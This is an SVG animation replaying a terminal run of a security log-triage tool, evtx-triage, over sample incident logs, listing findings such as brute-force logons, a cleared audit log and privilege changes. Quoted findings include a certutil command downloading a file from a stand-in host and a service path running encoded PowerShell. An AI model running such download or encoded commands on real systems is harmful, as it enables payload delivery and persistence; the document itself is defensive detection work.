<svg xmlns="http://www.w3.org/2000/svg" width="860" height="484" viewBox="0 0 860 484" role="img" aria-label="Terminal replay of evtx-triage on its sample data"><style>text{font:14px ui-monospace,Menlo,Consolas,monospace;fill:#d6deeb}.p{fill:#7fdbca}.c{fill:#ecc48d}.h{fill:#ff6b6b}.m{fill:#f78c6c}.l{fill:#82aaff}.i{fill:#8a96a8}@keyframes t{from{opacity:0}to{opacity:1}}.r{animation:t .01s backwards}.d0{animation-delay:0.40s}.d1{animation-delay:0.75s}.d2{animation-delay:1.10s}.d3{animation-delay:1.45s}.d4{animation-delay:1.80s}.d5{animation-delay:2.15s}.d6{animation-delay:2.50s}.d7{animation-delay:2.85s}.d8{animation-delay:3.20s}.d9{animation-delay:3.55s}.d10{animation-delay:3.90s}.d11{animation-delay:4.25s}.d12{animation-delay:4.60s}.d13{animation-delay:4.95s}.d14{animation-delay:5.30s}.d15{animation-delay:5.65s}</style><rect width="860" height="484" rx="10" fill="#011627"/><rect width="860" height="34" rx="10" fill="#0b2942"/><circle cx="20" cy="17" r="6" fill="#ff5f56"/><circle cx="40" cy="17" r="6" fill="#ffbd2e"/><circle cx="60" cy="17" r="6" fill="#27c93f"/><text x="430" y="22" text-anchor="middle" class="i">evtx-triage</text><text x="20" y="64" xml:space="preserve"><tspan class="p">$ </tspan>bin/evtx-triage examples</text><text class="r d0 " x="20" y="108" xml:space="preserve">3 files, 14 findings</text><text class="r d1 h" x="20" y="130" xml:space="preserve">CRITICAL EVT004 logs/incident.jsonl:13</text><text class="r d2 " x="20" y="152" xml:space="preserve">         administrator logged on from 198.51.100.77 on WS-FIN-07 after 12 failed logons</text><text class="r d3 h" x="20" y="174" xml:space="preserve">CRITICAL EVT001 logs/incident.jsonl:22</text><text class="r d4 " x="20" y="196" xml:space="preserve">         the Security audit log was cleared on WS-FIN-07 by administrator</text><text class="r d5 h" x="20" y="218" xml:space="preserve">HIGH     EVT003 logs/incident.jsonl:1</text><text class="r d6 " x="20" y="240" xml:space="preserve">         12 failed logons from 198.51.100.77</text><text class="r d7 h" x="20" y="262" xml:space="preserve">HIGH     EVT002 logs/incident.jsonl:13</text><text class="r d8 " x="20" y="284" xml:space="preserve">         RDP logon of administrator from public address 198.51.100.77 on WS-FIN-07</text><text class="r d9 h" x="20" y="306" xml:space="preserve">HIGH     EVT005 logs/incident.jsonl:14</text><text class="r d10 " x="20" y="328" xml:space="preserve">         service updsvc installed on WS-FIN-07 with suspicious image path cmd.exe /c powershell -enc SQB</text><text class="r d11 h" x="20" y="350" xml:space="preserve">HIGH     EVT007 logs/incident.jsonl:15</text><text class="r d12 " x="20" y="372" xml:space="preserve">         CN=svc_update was added to Administrators on WS-FIN-07</text><text class="r d13 h" x="20" y="394" xml:space="preserve">HIGH     EVT012 logs/incident.jsonl:18</text><text class="r d14 " x="20" y="416" xml:space="preserve">         suspicious command line on WS-FIN-07: certutil.exe -urlcache -f http://x.example/p.bin p.bin</text><text class="r d15 h" x="20" y="438" xml:space="preserve">HIGH     EVT013 logs/incident.jsonl:19</text></svg>
